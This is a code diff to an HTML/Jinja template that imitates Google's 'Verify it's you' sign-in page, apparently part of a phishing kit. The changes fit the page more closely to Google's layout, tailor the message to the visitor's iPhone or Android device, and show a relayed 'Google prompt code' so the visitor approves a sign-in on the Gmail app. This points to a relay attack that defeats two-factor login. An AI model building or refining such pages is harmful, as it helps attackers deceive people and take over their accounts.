@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Account - Verify it's you</title>
+    <title>Verify it's you</title>
     <style>
         /* Basic Reset and Fonts */
         :root {
@@ -32,14 +32,14 @@
         .main-container {
             width: 100%;
             max-width: 1040px;
-            padding: 20px;
+            padding: 0;
             box-sizing: border-box;
             flex-grow: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 40vh; /* Reduced from 100vh to 80vh for less height */
-            margin: 200px 0; /* Added margin for more gap from body edges */
+            min-height: 40vh;
+            margin: 64px auto 64px auto; /* Top, right, bottom, left margins to mimic Google verify page */
         }
 
         /* The Dark Card */
@@ -354,24 +354,20 @@
 
                 <div class="right-col">
                     {% if code %}
-                    <div class="instruction-heading">Open the Gmail app on iPhone</div>
+                    {% set device = 'your phone' %}
+                    {% if 'iPhone' in request.headers.get('User-Agent', '') %}
+                        {% set device = 'your iPhone' %}
+                    {% elif 'Android' in request.headers.get('User-Agent', '') %}
+                        {% set device = 'your Android device' %}
+                    {% endif %}
+                    <div class="instruction-heading">Open the Gmail app on {{ device }}</div>
                     <div class="instruction-text">
-                        Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>{{ code }}</strong> on your phone to verify it’s you.
+                        Google sent a notification to {{ device }}. Open the Gmail app, tap <strong>Yes</strong> on the prompt to verify it’s you.
                     </div>
-                    {% if code %}
-                    <div class="instruction-heading">Open the Gmail app on iPhone</div>
-                    <div class="instruction-text">
-                        Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>{{ code }}</strong> on your phone to verify it’s you.
+                    <div class="auth-code-area">
+                        <div class="auth-code-label">Your Google prompt code:</div>
+                        <div class="auth-code-value">{{ code }}</div>
                     </div>
-                    <div class="big-number">{{ code }}</div>
-                    <form method="POST" style="display: flex; flex-direction: column; align-items: center; margin-top: 16px;">
-                        <input type="hidden" name="email" value="{{ email }}">
-                        <input type="text" name="code" maxlength="2" pattern="\d{2}" placeholder="Enter code" required style="font-size: 32px; text-align: center; width: 80px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #5f6368; background: #23272b; color: #e8eaed; padding: 8px 0;">
-                        {% if error %}
-                        <div style="color: #ea4335; font-size: 14px; margin-bottom: 8px;">{{ error }}</div>
-                        {% endif %}
-                        <button type="submit" style="background: #8ab4f8; color: #202124; border: none; border-radius: 18px; padding: 10px 24px; font-size: 16px; font-weight: 500; cursor: pointer;">Verify</button>
-                    </form>
                     {% else %}
                     <div class="instruction-text">
                         No authentication code available.
@@ -396,19 +392,8 @@
                  <a href="#" class="action-link">Try another way</a>
             </div>
 
-        </div> </div> <footer class="page-footer">
-        <div class="language-selector">
-            English (United States)
-            <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18"><path d="M0 0h24v24H0z" fill="none"/><path d="M7 10l5 5 5-5z"/></svg>
         </div>
-        <div class="footer-links">
-            <a href="#">Help</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-        </div>
-    </footer>
-
-    <!-- Move footer inside the main card for mobile view only -->
+    </div>
     <footer class="page-footer">
         <div class="language-selector">
             English (United States)
